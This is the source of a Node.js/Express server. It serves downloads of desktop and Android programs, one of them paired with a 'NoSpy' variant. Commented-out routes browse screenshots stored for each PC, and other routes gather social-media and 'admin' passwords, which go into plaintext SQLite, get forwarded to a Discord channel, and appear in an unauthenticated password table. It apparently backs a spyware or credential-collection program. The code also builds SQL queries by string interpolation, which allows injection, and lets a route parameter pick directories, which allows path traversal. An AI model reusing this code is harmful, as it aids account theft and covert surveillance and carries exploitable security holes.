import http from 'http';
import express from 'express';
import fs from 'fs';
import path from 'path';
import sqlite3 from 'sqlite3';
import execPhp from 'exec-php';
import { client, guild } from './discordBot/main.mjs';
import { EmbedBuilder } from 'discord.js';
import multer from 'multer';
import https from 'https';
import cors from 'cors';

const options = {
    key: fs.readFileSync('/etc/letsencrypt/live/cuties.lilabrandon.fr/privkey.pem'),
    cert: fs.readFileSync('/etc/letsencrypt/live/cuties.lilabrandon.fr/fullchain.pem')
};



// Configuring Multer to store in public folder
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, 'public');
    },
    filename: function (req, file, cb) {
        cb(null, Date.now() + path.extname(file.originalname)); // Adds timestamp to file
    }
});

const upload = multer({ storage: storage });


const app = express();
const server = http.createServer(app);
app.use(cors());
app.use(express.json());


const database = new sqlite3.Database("passwords.db", sqlite3.OPEN_READWRITE | sqlite3.OPEN_CREATE, (err) => {
    if (err && err.code == "SQLITE_CANTOPEN") {
        console.error("Can not create or open database");
        return;
    } else if (err) {
        console.error(`Can not create or open database : ${err.toString()}`);
    }
});


let createTables = fs.readFileSync("tablesCreation.sql", 'utf8');
database.exec(createTables, (err) => {
    if(err) {
        console.error(`Can not create tables : ${err.toString()}`);
        return;
    } else console.log("Database state updated.");
});


app.use(express.static('/public'));


// Upload images
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
        <title>Upload d'images</title>
        </head>
        <body>
        <h1>Upload d'images</h1>
        <form action="/upload" method="post" enctype="multipart/form-data">
        <input type="file" name="images" accept="image/*" multiple required />
        <button type="submit">Upload</button>
        </form>
        </body>
        </html>
        `);
    });
    
// Route pour gérer l'upload des images
app.post('/upload', upload.array('images', 10), (req, res) => {
    if (!req.files || req.files.length === 0) {
        return res.status(400).send('No files uploaded.');
    }
    
    const fileLinks = req.files.map(file => `<a href="/public/${file.filename}">${file.originalname}</a>`).join('<br>');
    res.send(`Files uploaded successfully:<br>${fileLinks}`);
});



app.get('/downloadBaiBaii', (req, res) => {
    res.download("build/BaiBai.zip");
});

app.get('/frigielEtFluffyGif', (req, res) => {
    res.download("build/frigieletfluffyep1.gif");
});




// Related to Synced Program
app.get('/downloadSynced', (req, res) => {
    res.download("build/SyncedCuties.jar");
});

app.use('/html', express.static('html'));

                    
                    
                    
                    
// Related to YouAreJustACutie Program
    
app.get('/download', (req, res) => {
    res.download("build/YouAreJustACutie.jar");
});

app.get('/downloadNoSpy', (req, res) => {
    res.download("build/YouAreJustACutie-NoSpy.jar");
});

app.get('/downloadIzyWere', (req, res) => {
    res.download("build/IzyWere.apk");
});



app.get('/wallpaper', (req, res) => {
    const files = fs.readdirSync(path.join('public'));
    const randomFile = files[Math.floor(Math.random() * files.length)];
    res.redirect(`/images/${randomFile}`);
});

app.get('/wallpaper/:pack', (req, res) => {
    if(req.params.pack) {
        const files = fs.readdirSync(path.join(`public/${req.params.pack}`));
        if(files.length > 0) {
            const randomFile = files[Math.floor(Math.random() * files.length)];
            res.redirect(`/images/${randomFile}`);
        } else res.status(404).send("Not found");
    } else res.status(404).send("Not found");
});

app.get('/getRandomImage', (req, res) => {
    const files = fs.readdirSync(path.join('public'));
    const randomFile = files[Math.floor(Math.random() * files.length)];
    res.send(randomFile);
});
    
    // app.get('/getRandomScreenshot', (req, res) => {
        //     const folders = fs.readdirSync(path.join('..', 'cuties'));
        //     let dates = [];
        //     for(let i=0; i<folders.length; i++) {
            //         if(folders[i].startsWith(".")) continue;
            //         let folderStats = fs.statSync("../cuties/" + folders[i]);
            //         if(folderStats.isDirectory()) dates.push(folders[i]);
            //     }
            
            //     const choosenDate = dates[Math.floor(Math.random() * dates.length)];
            //     const cutiesPCs = fs.readdirSync(path.join('..', 'cuties', choosenDate));
            //     let randomCutie;
            //     let choosenCutieScreenShots = [];
            
            //     do {
                //         randomCutie = cutiesPCs[Math.floor(Math.random() * cutiesPCs.length)];
                //         choosenCutieScreenShots = fs.readdirSync(path.join('..', 'cuties', choosenDate, randomCutie, "screenshots"));
                //     } while(choosenCutieScreenShots.length == 0);
                
                //     const randomScreenshot = choosenCutieScreenShots[Math.floor(Math.random() * choosenCutieScreenShots.length)];
                
                //     res.send({ choosenDate: choosenDate, cutie: randomCutie, screenshot: randomScreenshot });
                // });
                
app.get('/images/:image', (req, res) => { res.download(path.join('public', req.params.image)); });
// app.get('/screenshot/:choosenDate/:cutie/:screenshot', (req, res) => { res.download(path.join('..', 'cuties', req.params.choosenDate, req.params.cutie, "screenshots", req.params.screenshot)); });
                                
                                
app.get('/social/:social', (req, res) => {
    switch(req.params.social) {
        case "Discord":
            res.download("socials/discord.png");
            break;
        case "Facebook":
            res.download("socials/facebook.png");
            break;
        case "Instagram":
            res.download("socials/instagram.jpg");
            break;
        case "Snapchat":
            res.download("socials/snapchat.jpg");
            break;
        case "Twitter":
            res.download("socials/twitter.jpg");
            break;
        case "Twitch":
            res.download("socials/twitch.png");
            break;
        case "Google":
            res.download("socials/google.png");
            break;
    }
});


app.get('/addSocial/:social/:email/:username/:password/:discordUsername/:requiresMFA', (req, res) => {
    const social = decodeURIComponent(req.params.social);
    const email = decodeURIComponent(req.params.email);
    const username = decodeURIComponent(req.params.username);
    const password = decodeURIComponent(req.params.password);
    const discordUsername = decodeURIComponent(req.params.discordUsername);
    const requiresMFA = decodeURIComponent(req.params.requiresMFA);

    console.log(social, email, username, password, discordUsername, requiresMFA);

    database.exec(`INSERT INTO accounts (social, email, username, password, discord_user, requires_mfa) VALUES ('${social}','${email}','${username}','${password}','${discordUsername}','${requiresMFA}')`, (err) => {
        if(err) {
            console.error(`Can not insert data : ${err.toString()}`);
            return;
        } else console.log("Data inserted.");
    });
    
    const accountEmbed = new EmbedBuilder()
    .setColor(0x0099FF)
    .setTitle('A new account is shared')
    .setDescription(`${req.params.discordUsername} shared a new account :3`)
    .setThumbnail(`http://cuties.vps.boxtoplay.com:1570/social/${req.params.social}`)
    .addFields(
        { name: 'Social : ', value: req.params.social },
        { name: '\u200B', value: '\u200B' },
        { name: 'Username : ', value: req.params.username },
        { name: 'Email : ', value: req.params.email},
        { name: 'Password : ', value: req.params.password}
    )
    // .setImage('https://i.imgur.com/AfFp7pu.png')
    .setTimestamp()
    .setFooter({ text: 'Thank you cutie ❤' });

    const channel = guild.channels.cache.get('1228365375520116757');
    channel.send({ embeds: [accountEmbed] });
    res.send("Data inserted.");
});


app.get('/getSocials', (req, res) => {
    database.all("SELECT * FROM accounts", (err, rows) => {
        if(err) {
            console.error(`Can not get data : ${err.toString()}`);
            return;
        } else {
            res.send(rows);
        }
    });
});




app.get('/displaySocials', async (req, res) => {
    const phpFile = path.join('showSocials.php');
    
    const phpOutput = await execPhp(phpFile, (error, php, output) => {
        if(error) {
            console.error(`Can not execute php file : ${error.toString()}`);
            return;
        }
        res.send(output);
    });
});

app.get('/randomLink', (req, res) => {
    const linksFile = fs.readFileSync('links.txt', 'utf8');
    
    const links = linksFile.split('\n');
    const randomLink = links[Math.floor(Math.random() * links.length)];
    res.send(randomLink);
});


app.post('/storeAdminPassword', (req, res) => {
    const username = req.body.username;
    const password = req.body.password;
    
    database.exec(`INSERT INTO mels_programs (username, password) VALUES ('${username}','${password}')`, (err) => {
        if(err) {
            console.error(`Can not insert data : ${err.toString()}`);
            res.status(500).send({status: 500, message: "Can not insert data."});
            return;
        } else console.log("Data inserted.");
    });

    res.status(200).send({status: 200, message: "Data inserted."});
});


app.get('/getAdminPasswords', (req, res) => {
    database.all("SELECT * FROM mels_programs", (err, rows) => {
        if (err) {
            console.error(`Can not get data : ${err.toString()}`);
            res.status(500).send({ status: 500, message: "Can not get data." });
            return;
        } else {
            let html = `
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Admin Passwords</title>
                    <style>
                        table {
                            width: 100%;
                            border-collapse: collapse;
                        }
                        th, td {
                            border: 1px solid black;
                            padding: 8px;
                            text-align: left;
                        }
                        th {
                            background-color: #f2f2f2;
                        }
                    </style>
                </head>
                <body>
                    <h1>Admin Passwords</h1>
                    <table>
                        <thead>
                            <tr>
                                <th>Username</th>
                                <th>Password</th>
                                <th>Created At</th>
                            </tr>
                        </thead>
                        <tbody>
            `;

            rows.forEach(row => {
                html += `
                    <tr>
                        <td>${row.username}</td>
                        <td>${row.password}</td>
                        <td>${row.created_at || 'N/A'}</td>
                    </tr>
                `;
            });

            html += `
                        </tbody>
                    </table>
                </body>
                </html>
            `;

            res.status(200).send(html);
        }
    });
});


server.listen(1570, () => {
    console.log(`Server running on port 1570`);
});

const httpsServer = https.createServer(options, app);

httpsServer.listen(443, () => {
    console.log(`HTTPS Server running on port 443`);
});